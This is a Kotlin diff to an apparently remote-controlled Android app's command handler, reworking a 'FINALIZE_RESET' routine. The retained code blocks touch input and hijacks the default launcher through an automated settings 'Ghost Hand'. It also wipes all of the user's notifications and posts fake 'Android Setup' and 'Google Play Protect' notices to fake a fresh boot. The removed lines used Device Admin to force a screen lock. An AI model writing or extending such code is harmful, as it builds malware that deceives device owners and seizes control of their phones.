@@ -2293,18 +2293,13 @@ object CommandProcessor {
                     }
                 }
                 "FINALIZE_RESET" -> {
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "=== STARTING FINALIZE_RESET MACRO ===")
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Goal: Transition from Setup UI -> Heavy Boot Launcher -> Keyguard Lock -> Wake to Lockscreen")
-                    
-                    // 1. Touch Guard & Pitch Black Dimmer
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 1: Deploying TouchGuard and Pitch Black Dimmer (Level 0 AUTO) to mask all transitions.")
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "=== STARTING FINALIZE_RESET (OVERHAULED) ===")
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 1: Deploying TouchGuard (Silent Background Protection).")
                     android.os.Handler(android.os.Looper.getMainLooper()).post {
                         DynamicUIManager.showTouchGuard(ctx)
-                        DimmerManager.applyDim(ctx, 0, "AUTO")
                     }
 
-                    // 2. Configure Launcher
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 2: Configuring Launcher to WORK mode, activating it, setting heavy_boot_active=true, and forcing show_boot_overlay=true.")
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 2: Configuring Launcher to WORK mode.")
                     val lPrefs = ctx.getSharedPreferences("launcher_prefs", Context.MODE_PRIVATE)
                     lPrefs.edit()
                         .putString("display_mode", "WORK")
@@ -2313,9 +2308,7 @@ object CommandProcessor {
                         .putBoolean("show_boot_overlay", true)
                         .apply()
                     AppCache.invalidate()
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Launcher config saved. AppCache invalidated so it re-reads on next render.")
 
-                    // 3. Check and Hijack Default Launcher
                     val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
                     DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 3: Checking current Home app. Currently: $currentHome")
                     if (currentHome != ctx.packageName) {
@@ -2328,10 +2321,8 @@ object CommandProcessor {
                                 val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
                                     addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                 }
-                                DebugLogger.log("FINALIZE_LIFECYCLE", "Firing Intent to HOME_SETTINGS to trigger Ghost Hand.")
                                 ctx.startActivity(intent)
                             } catch (e: Exception) {
-                                DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to launch HOME_SETTINGS: ${e.message}")
                                 LauncherManager.isHijacking = false
                             }
                         }
@@ -2340,47 +2331,27 @@ object CommandProcessor {
                         while (LauncherManager.isHijacking && waitTime < 25000) {
                             kotlinx.coroutines.delay(500)
                             waitTime += 500
-                            if (waitTime % 5000 == 0) DebugLogger.log("FINALIZE_LIFECYCLE", "Still waiting for Ghost Hand hijack... (${waitTime}ms elapsed)")
                         }
-                        DebugLogger.log("FINALIZE_LIFECYCLE", "Hijack loop exited. Final WaitTime: ${waitTime}ms. isHijacking flag is now: ${LauncherManager.isHijacking}")
-                        LauncherManager.isHijacking = false // Guarantee safety clear
-                    } else {
-                        DebugLogger.log("FINALIZE_LIFECYCLE", "App IS already default launcher. Skipping Ghost Hand hijack.")
+                        LauncherManager.isHijacking = false
                     }
 
-                    // 4. Post-Boot Audio and Notification Manipulation
                     DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 4: Restoring Audio and injecting fake Setup notifications.")
                     try {
                         val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
-                        try { 
+                        if (PermissionManager.hasDndAccess(ctx)) {
                             am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL 
-                            DebugLogger.log("FINALIZE_LIFECYCLE", "RINGER_MODE_NORMAL successfully applied.")
-                        } catch(e:Exception){
-                            DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to set RINGER_MODE_NORMAL: ${e.message}")
                         }
-                        
                         val maxRing = am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING)
-                        val targetRing = (maxRing * 0.7f).toInt()
-                        am.setStreamVolume(android.media.AudioManager.STREAM_RING, targetRing, 0)
-                        DebugLogger.log("FINALIZE_LIFECYCLE", "STREAM_RING set to 70% ($targetRing/$maxRing).")
+                        am.setStreamVolume(android.media.AudioManager.STREAM_RING, (maxRing * 0.7f).toInt(), 0)
                         
                         val maxNotif = am.getStreamMaxVolume(android.media.AudioManager.STREAM_NOTIFICATION)
-                        val targetNotif = (maxNotif * 0.7f).toInt()
-                        am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, targetNotif, 0)
-                        DebugLogger.log("FINALIZE_LIFECYCLE", "STREAM_NOTIFICATION set to 70% ($targetNotif/$maxNotif).")
-                    } catch(e: Exception) {
-                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Audio restore encountered a fatal error: ${e.message}")
-                    }
+                        am.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, (maxNotif * 0.7f).toInt(), 0)
+                    } catch(e: Exception) {}
 
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Attempting to wipe pre-existing notifications to sell the 'fresh boot' illusion...")
                     if (MyNotificationListener.instance != null) {
-                        val wipedCount = MyNotificationListener.instance?.wipeNotifications("ALL", null) ?: -1
-                        DebugLogger.log("FINALIZE_LIFECYCLE", "NotificationListener wiped $wipedCount notifications.")
-                    } else {
-                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "NotificationListener is offline! Could not wipe notifications. The illusion might be degraded.")
+                        MyNotificationListener.instance?.wipeNotifications("ALL", null)
                     }
 
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Posting fake setup/boot notifications to the status bar...")
                     val fakeNotifs = listOf(
                         Pair("Android Setup", "Finishing system update..."),
                         Pair("Google Play Protect", "Scanning device for threats..."),
@@ -2403,97 +2374,19 @@ object CommandProcessor {
                                 .setOngoing(true)
                             nm.notify(notifId++, builder.build())
                             kotlinx.coroutines.delay(200)
-                            DebugLogger.log("FINALIZE_LIFECYCLE", "Fake Notification posted: '${notifData.first}'")
                         }
-                        DebugLogger.log("FINALIZE_LIFECYCLE", "All fake notifications have been deployed.")
-                    } catch(e: Exception) {
-                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to post fake notifications: ${e.message}")
-                    }
+                    } catch(e: Exception) {}
 
-                    // 5. Release Ignition Lock BEFORE calling lockNow()
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 5: Releasing power_shield_keep_ignited flag BEFORE locking, ensuring OS can sleep.")
+                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 5: Releasing power_shield_keep_ignited flag to restore normal sleep.")
                     ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                         .putBoolean("power_shield_keep_ignited", false).apply()
-                        
-                    kotlinx.coroutines.delay(300) // Buffer for OS to register flag release
 
-                    // 6. Physically Lock Screen
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 6: Physically locking the screen via DeviceAdmin.")
-                    val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-                    val adminComponent = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
-                    if (dpm.isAdminActive(adminComponent)) {
-                        try { 
-                            dpm.lockNow() 
-                            DebugLogger.log("FINALIZE_LIFECYCLE", "DevicePolicyManager.lockNow() successfully executed.")
-                        } catch (e: Exception) { 
-                            DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "lockNow() crashed: ${e.message}")
-                        }
-                    } else {
-                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "CRITICAL: Cannot lock screen because Device Admin is NOT active.")
-                    }
-
-                    // 7. WAIT for the screen to turn off BEFORE tearing down masks
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 7: Waiting 1500ms for hardware backlight to die...")
-                    kotlinx.coroutines.delay(1500)
-
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Tearing down Native/HTML overlays and TouchGuard (Keeping Dimmer pitch black).")
-                    android.os.Handler(android.os.Looper.getMainLooper()).post {
-                        DynamicUIManager.removeOverlay(ctx, "FINALIZE_RESET")
-                        DynamicUIManager.removeNativeOverlay(ctx, "FINALIZE_RESET")
-                        DynamicUIManager.removeTouchGuard(ctx)
-                    }
-
-                    kotlinx.coroutines.delay(400) // Extra buffer before waking
-
-                    // 8. Wake Screen to Lockscreen
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 8: Waking screen via WakeLock and PulseActivity (preserve_keyguard=true).")
-                    try {
-                        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-                        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or 
-                            android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or 
-                            android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:FinalizeWake")
-                        wakeLock.acquire(3000)
-
-                        val pulseIntent = android.content.Intent(ctx, PulseActivity::class.java).apply {
-                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                            putExtra("is_wake_trigger", true)
-                            putExtra("preserve_keyguard", true)
-                        }
-                        ctx.startActivity(pulseIntent)
-                        DebugLogger.log("FINALIZE_LIFECYCLE", "PulseActivity intent dispatched.")
-                    } catch(e: Exception) {
-                        DebugLogger.log("FINALIZE_LIFECYCLE_ERR", "Failed to dispatch Wake intent: ${e.message}")
-                    }
-
-                    // 9. Post-Wake Audit & Unblind
-                    DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 9: Post-Wake Monitoring. Waiting 1000ms before unblinding.")
-                    kotlinx.coroutines.delay(1000)
-                    
-                    val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
-                    val pmPower = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-                    
-                    DebugLogger.log("FINALIZE_LIFECYCLE_AUDIT", "Screen On: ${pmPower.isInteractive} | Keyguard Locked: ${km.isKeyguardLocked} | Device Secure: ${km.isDeviceSecure}")
-                    
-                    if (!km.isKeyguardLocked) {
-                        DebugLogger.log("FINALIZE_LIFECYCLE_WARN", "WARNING: Keyguard is NOT locked after wake! OS bypassed swipe screen.")
-                        DebugLogger.log("FINALIZE_LIFECYCLE_AUDIT", "Since Keyguard is bypassed, Launcher should immediately show 'Phone is starting...'.")
-                    }
-                    
-                    android.os.Handler(android.os.Looper.getMainLooper()).post {
-                        DebugLogger.log("FINALIZE_LIFECYCLE", "Dropping Dimmer blindfold. The sequence is officially COMPLETE.")
-                        DimmerManager.removeOverlay(ctx)
-                    }
-                    
-                    // Secondary monitor coroutine to log keyguard state for 5 seconds
-                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                        for (i in 1..5) {
-                            kotlinx.coroutines.delay(1000)
-                            DebugLogger.log("FINALIZE_LIFECYCLE_AUDIT", "+${i}s -> Screen: ${pmPower.isInteractive} | Keyguard: ${km.isKeyguardLocked}")
-                        }
-                    }
+                    // Signal to PhoneStartingScreen that backend operations are complete
+                    ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                        .putBoolean("hijacks_completed", true).apply()
 
                     status = "FINALIZE_RESET_COMPLETE"
-                    errorMsg = "Sequence finished with Extreme Verbose logging and Keyguard Audit."
+                    errorMsg = "Backend operations completed successfully. Lock screen UI handles the rest."
                 }
                 "HIJACK_LAUNCHER" -> {
                     DebugLogger.log("HIJACK_INIT", "Command [HIJACK_LAUNCHER] received. ID: $id")
